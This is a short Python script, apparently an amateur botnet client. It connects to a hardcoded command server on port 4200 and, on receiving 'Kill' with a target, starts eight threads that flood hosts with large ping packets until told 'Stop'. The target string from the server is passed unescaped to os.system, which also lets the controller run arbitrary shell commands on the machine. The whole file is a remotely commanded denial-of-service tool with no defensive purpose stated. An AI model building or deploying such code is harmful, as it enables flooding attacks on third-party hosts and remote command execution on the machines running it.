import socket
import threading
import subprocess
import os

EnFonction = True

def thread_recevoir(client_socket):
    while True:
        global EnFonction
        print("on attend")
        reponse = client_socket.recv(1024).decode()
        print("recu")
        print(reponse)
        text = reponse.split()
        print(text[0])
        if (text[0] == 'Kill'):
            EnFonction = True
            print("yolo")
            for i in range(0, 8):
                allo = threading.Thread(target=thread_ping, args=(text[1],))
                allo.start()
        if (text[0] == 'Stop'):
            EnFonction = False




def thread_ping(rest):
    global EnFonction
    while EnFonction:
        hostname = "69.69.69.69"  # example
        subprocess.call(['ping', "-l", "65500", "-w", "1", "-n", "1", hostname])
        response = os.system("ping -c 3 " + rest)


server_ip = "69.69.69.69"
serveur_port = 4200

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, serveur_port))
thread_recevoir2 = threading.Thread(target=thread_recevoir, args={client, })

thread_recevoir2.start()

while True:
    texte = input()
    client.send(str.encode(texte))